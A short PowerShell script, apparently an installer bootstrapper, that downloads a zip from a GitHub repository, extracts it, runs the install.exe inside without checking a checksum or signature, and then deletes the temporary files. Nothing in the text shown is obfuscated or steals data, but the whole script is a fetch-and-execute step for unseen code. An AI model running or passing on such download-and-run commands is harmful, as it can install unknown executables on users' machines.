# Download, extract, and run installer script
# Creates temp directory, downloads zip, extracts, runs install.exe, then cleans up

# Create unique temp directory
$tempDir = [System.IO.Path]::GetTempPath() + [System.Guid]::NewGuid()
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

try {
    # Download the zip file
    Write-Host "Downloading installer..."
    $zipPath = "$tempDir\temp.zip"
    Invoke-WebRequest -Uri 'https://github.com/Ogyeet10/installer9000/raw/refs/heads/main/install.exe.zip' -OutFile $zipPath
    
    # Extract the zip file
    Write-Host "Extracting files..."
    Expand-Archive -Path $zipPath -DestinationPath $tempDir -Force
    
    # Find and run install.exe
    $installer = Get-ChildItem -Path $tempDir -Name 'install.exe' -Recurse | Select-Object -First 1
    
    if ($installer) {
        Write-Host "Running installer..."
        & "$tempDir\$installer"
    } else {
        Write-Host "Error: install.exe not found in the extracted files"
        exit 1
    }
    
} catch {
    Write-Host "Error occurred: $($_.Exception.Message)"
    exit 1
} finally {
    # Clean up temp files
    Write-Host "Cleaning up..."
    Start-Sleep -Seconds 2
    Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
}

Write-Host "Done!"
